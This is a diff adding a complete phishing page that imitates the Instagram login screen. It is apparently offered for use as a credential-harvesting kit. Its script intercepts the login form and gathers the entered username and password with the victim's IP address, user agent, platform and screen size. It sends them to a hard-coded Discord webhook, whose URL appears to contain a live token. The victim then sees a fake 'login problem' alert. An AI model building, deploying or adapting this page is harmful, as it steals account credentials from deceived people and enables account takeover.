@@ -1,0 +1,467 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            color: #262626;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .flex {
+            display: flex;
+        }
+        
+        .direction-column {
+            flex-direction: column;
+        }
+        
+        .align-items-center {
+            align-items: center;
+        }
+        
+        .justify-content-center {
+            justify-content: center;
+        }
+        
+        .flex-wrap {
+            flex-wrap: wrap;
+        }
+        
+        main {
+            flex-grow: 1;
+            padding: 32px 0;
+        }
+        
+        #mobile {
+            background-image: url('images/1dc085cdb87d.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            height: 618px;
+            width: 454px;
+            margin-right: 32px;
+            position: relative;
+            transition: transform 0.3s ease;
+        }
+        
+        #mobile:hover {
+            transform: scale(1.02);
+        }
+        
+        #mobile::before {
+            content: '';
+            position: absolute;
+            top: 27px;
+            right: 113px;
+            width: 250px;
+            height: 538px;
+            background-size: cover;
+            background-repeat: no-repeat;
+            animation: phoneSlideshow 12s infinite;
+        }
+        
+        @keyframes phoneSlideshow {
+            0%, 25% { background-image: url('images/screenshot1.png'); }
+            30%, 55% { background-image: url('images/screenshot2.png'); }
+            60%, 85% { background-image: url('images/screenshot3.png'); }
+            90%, 100% { background-image: url('images/screenshot4.png'); }
+        }
+        
+        #auth {
+            width: 350px;
+        }
+        
+        .panel {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+        }
+        
+        .login {
+            padding-top: 40px;
+            padding-bottom: 30px;
+        }
+        
+        h1 img {
+            width: 175px;
+            margin-bottom: 20px;
+            transition: transform 0.3s ease;
+        }
+        
+        h1 img:hover {
+            transform: scale(1.05);
+        }
+        
+        form {
+            width: 100%;
+        }
+        
+        input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            margin-bottom: 6px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            transition: border-color 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 7px 16px;
+            font-weight: 600;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        
+        button:hover {
+            background-color: #0077cc;
+        }
+        
+        .separator {
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-weight: 600;
+            font-size: 13px;
+        }
+        
+        .separator span {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        
+        .or {
+            margin: 0 18px;
+        }
+        
+        .login-with-fb {
+            margin-top: 10px;
+        }
+        
+        .login-with-fb div {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+        
+        .login-with-fb img {
+            width: 16px;
+            margin-right: 8px;
+        }
+        
+        .login-with-fb a {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .login-with-fb a:last-child {
+            color: #00376b;
+            font-size: 12px;
+            font-weight: 400;
+        }
+        
+        .register {
+            padding: 20px;
+        }
+        
+        .register p {
+            margin-right: 5px;
+            font-size: 14px;
+        }
+        
+        .register a {
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .register a:hover {
+            color: #0077cc;
+        }
+        
+        .app-download p {
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .app-download img {
+            height: 40px;
+            margin: 0 4px;
+            transition: transform 0.3s ease;
+        }
+        
+        .app-download img:hover {
+            transform: scale(1.05);
+        }
+        
+        footer {
+            padding: 20px 0;
+        }
+        
+        footer ul {
+            list-style: none;
+            margin-bottom: 16px;
+        }
+        
+        footer li {
+            margin: 0 8px 12px;
+        }
+        
+        footer a {
+            color: #8e8e8e;
+            font-size: 12px;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        footer a:hover {
+            color: #262626;
+        }
+        
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border-width: 0;
+        }
+        
+        @media (max-width: 875px) {
+            #mobile {
+                display: none;
+            }
+            
+            main {
+                padding: 20px 0;
+            }
+        }
+        
+        @media (max-width: 450px) {
+            .panel {
+                background-color: transparent;
+                border: none;
+                padding: 20px 0;
+            }
+            
+            #auth {
+                width: 100%;
+                padding: 0 20px;
+            }
+        }
+    </style>
+    <link rel="icon" type="image/png" href="images/36b3ee2d91ed.ico">
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="images/7a252de00b20.png" alt="Instagram logo" title="Instagram logo">
+                </h1>
+                <form id="login-form">
+                    <label for="email" class="sr-only">Phone, username, or email</label>
+                    <input id="email" name="email" placeholder="Phone, username, or email" required="">
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input id="password" name="password" type="password" placeholder="Password" required="">
+
+                    <button type="submit">Log In</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img src="https://img.icons8.com/?size=100&id=uLWV5A9vXIPu&format=png&color=000000">
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                    <img src="images/180ae7a0bcf7.png" alt="Apple App Store logo" title="Apple App Store">
+                    <img src="images/e9cd846dc748.png" alt="Google Play logo" title="Google Play Store">
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CAREERS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">MORE ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <p class="copyright">© 2025 Instagram from Meta</p>
+    </footer>
+
+    <script src="js/axios.min.js"></script>
+    <script>
+        // Replace this with your Discord webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1394045897981034689/CDLilnqdHn9ruhB6PvwYZtxImeq8WX0UGyevVbNByl2-srVAPBKsDwaoOGKNRfoJ-pvu";
+        
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Show loading state
+            const button = e.target.querySelector('button');
+            button.textContent = 'Logging In...';
+            button.style.backgroundColor = '#0077cc';
+            button.disabled = true;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    // Create embed for Discord
+                    const embed = {
+                        title: "New Login Attempt",
+                        color: 16711680, // Red color
+                        fields: [
+                            {
+                                name: "Credentials",
+                                value: `**Email/Username:** ${email}\n**Password:** ${password}`,
+                                inline: false
+                            },
+                            {
+                                name: "Device Info",
+                                value: `**IP Address:** ${ip}\n**Device Type:** ${deviceType}\n**Platform:** ${platform}`,
+                                inline: true
+                            },
+                            {
+                                name: "Technical Info",
+                                value: `**Screen Resolution:** ${screenWidth}x${screenHeight}\n**User Agent:** ${userAgent}`,
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+
+                    // Send data to Discord webhook
+                    axios.post(WEBHOOK_URL, {
+                        embeds: [embed],
+                        content: "New login attempt captured!"
+                    }).then(response => {
+                        // Reset form and button
+                        button.textContent = 'Log In';
+                        button.style.backgroundColor = '#0095f6';
+                        button.disabled = false;
+                        
+                        // Show success message
+                        alert('يوجد مشكلة في التسجيل الدخول. يرجى المحاولة مرة أخرى.');
+                    }).catch(error => {
+                        console.error('Error sending to Discord:', error);
+                        button.textContent = 'Log In';
+                        button.style.backgroundColor = '#0095f6';
+                        button.disabled = false;
+                        alert('Error during login. Please try again.');
+                    });
+                })
+                .catch(error => {
+                    console.error('Error getting IP:', error);
+                    button.textContent = 'Log In';
+                    button.style.backgroundColor = '#0095f6';
+                    button.disabled = false;
+                    alert('Error fetching your information. Please try again.');
+                });
+        });
+
+        // Animation for the phone screenshots
+        const phone = document.getElementById('mobile');
+        const screenshots = [
+            'screenshot1.png',
+            'screenshot2.png',
+            'screenshot3.png',
+            'screenshot4.png'
+        ];
+        
+        let currentScreenshot = 0;
+        
+        function changeScreenshot() {
+            currentScreenshot = (currentScreenshot + 1) % screenshots.length;
+            phone.style.backgroundImage = `url(${screenshots[currentScreenshot]})`;
+        }
+        
+        // Change screenshot every 3 seconds
+        setInterval(changeScreenshot, 3000);
+        
+        // Add hover effect to buttons and links
+        document.querySelectorAll('button, a').forEach(element => {
+            element.addEventListener('mouseenter', () => {
+                element.style.transform = 'scale(1.02)';
+            });
+            
+            element.addEventListener('mouseleave', () => {
+                element.style.transform = 'scale(1)';
+            });
+        });
+    </script>
+
+
+</body></html>
